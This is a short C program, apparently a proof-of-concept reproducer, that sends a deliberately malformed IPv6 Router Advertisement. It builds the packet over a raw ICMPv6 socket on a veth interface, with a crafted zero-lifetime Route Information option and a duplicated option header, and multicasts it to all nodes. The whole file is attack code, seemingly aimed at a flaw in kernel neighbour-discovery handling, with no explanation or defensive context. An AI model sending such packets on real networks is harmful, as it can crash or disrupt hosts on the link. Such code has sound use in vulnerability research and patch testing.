#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/icmpv6.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <fcntl.h>

#define VETH1_NAME "veth1"
#define VETH2_NAME "veth2"
#define VETH1_ADDR "2001:db8::1"
#define VETH2_ADDR "2001:db8::2"
#define BROADCAST_ADDR "FF02::1"

void perror_exit(const char *msg)
{
    perror(msg); exit(1);
}

struct nd_opt_hdr {
    unsigned char nd_opt_type;
    unsigned char nd_opt_len;
};

 struct route_info {
    __u8 type;
    __u8 length;
    __u8 prefix_len;
    __u8 reserved_l : 3;
    __u8 route_pref : 2;
    __u8 reserved_h : 3;
    __be32 lifetime;
    __u8 prefix[];
};

int main() {
    int ret;
    int sockfd;
    void *pkt;
    void *ra_msg;
    struct sockaddr_in6 dest_addr = {};
    struct msghdr msg = {};
    struct icmp6hdr *icmphdr;
    struct iovec iov[1];
    struct cmsghdr *cmsg;
    struct nd_opt_hdr *nd_opt;
    char control_buffer[CMSG_SPACE(sizeof(int))];

    sockfd = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
    setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, VETH1_NAME, strlen(VETH1_NAME));

    dest_addr.sin6_family = AF_INET6;
    inet_pton(AF_INET6, BROADCAST_ADDR, &dest_addr.sin6_addr);

    struct route_info ri = {};
    ri.lifetime = htons(0x0);

    icmphdr = pkt = malloc(0x2000);
    ra_msg = pkt + sizeof(unsigned int) * 2;
    nd_opt = ra_msg + sizeof(*icmphdr);
    nd_opt->nd_opt_len = (sizeof(ri) + 7) / 8;
    nd_opt->nd_opt_type = 24; // ND_OPT_ROUTE_INFO
    memcpy(nd_opt + 1, &ri, sizeof(ri));
    nd_opt = (void*)nd_opt + (nd_opt->nd_opt_len << 3);

    icmphdr->icmp6_type = 134; // NDISC_ROUTER_ADVERTISEMENT
    icmphdr->icmp6_code = 0;
    icmphdr->icmp6_dataun.u_nd_ra.rt_lifetime = htons(1337);
    iov[0].iov_base = pkt;
    iov[0].iov_len = (void*)nd_opt - pkt;

    msg.msg_name = &dest_addr;
    msg.msg_namelen = sizeof(dest_addr);
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;
    msg.msg_control = control_buffer;
    msg.msg_controllen = sizeof(control_buffer);

    cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_IPV6;
    cmsg->cmsg_type = IPV6_HOPLIMIT;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    *((int *)CMSG_DATA(cmsg)) = 255;


    if (sendmsg(sockfd, &msg, 0) < 0)
        perror_exit("Failed to send ICMPv6 packet");

    printf("ICMPv6 sent.\n");
    close(sockfd);

    return 0;
}